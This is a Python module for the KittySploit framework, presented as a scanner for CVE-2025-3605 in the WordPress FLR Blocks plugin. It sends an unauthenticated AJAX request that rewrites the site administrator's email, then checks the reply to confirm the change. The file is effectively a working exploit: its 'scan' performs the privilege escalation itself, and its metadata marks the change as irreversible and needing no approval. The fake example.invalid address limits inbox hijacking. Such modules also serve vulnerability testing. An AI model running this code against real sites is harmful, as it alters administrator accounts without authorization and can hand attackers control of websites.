#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Frontend Login and Registration Blocks - Privilege Escalation"""

import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "FLR Blocks <= 1.0.7 - Privilege Escalation",
        "description": (
            "Unauthenticated attackers can change the administrator email via "
            "flrblocksusersettingsupdatehandle AJAX action."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2025-3605",
        "tags": [
            "web", "scanner", "cve", "cve2025", "vuln",
            "wordpress", "wp-plugin", "priv-esc", "vkev", "intrusive",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 1,
            "reversible": False,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.5,
            "value": 1.0,
        },
        "references": [
            "https://www.wordfence.com/threat-intel/vulnerabilities/id/0c11668c-6dc3-4539-b2be-bf6528bed73e?source=cve",
            "https://nvd.nist.gov/vuln/detail/CVE-2025-3605",
        ],
    }

    def run(self):
        # Use a clearly fake email domain to avoid hijacking real inboxes if vulnerable.
        email = f"ks_{secrets.token_hex(4)}@example.invalid"
        data = (
            "action=flrblocksusersettingsupdatehandle"
            "&user_id=1"
            f"&flr-blocks-email-update={email}"
        )
        r = self.http_request(
            method="POST",
            path="/wp-admin/admin-ajax.php",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=data,
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        ctype = (r.headers.get("Content-Type") or r.headers.get("content-type") or "").lower()
        if "application/json" not in ctype:
            return False
        if 'status":true' not in body.replace(" ", "") and '"status":true' not in body.replace(" ", ""):
            # also accept spaced JSON
            if '"status": true' not in body:
                return False
        if "Operation has been completed successfully" not in body:
            return False
        self.set_info(
            severity="critical",
            cve="CVE-2025-3605",
            reason="FLR Blocks allowed unauthenticated admin email change",
            path="/wp-admin/admin-ajax.php",
            proof_email=email,
            confidence="high",
        )
        return True
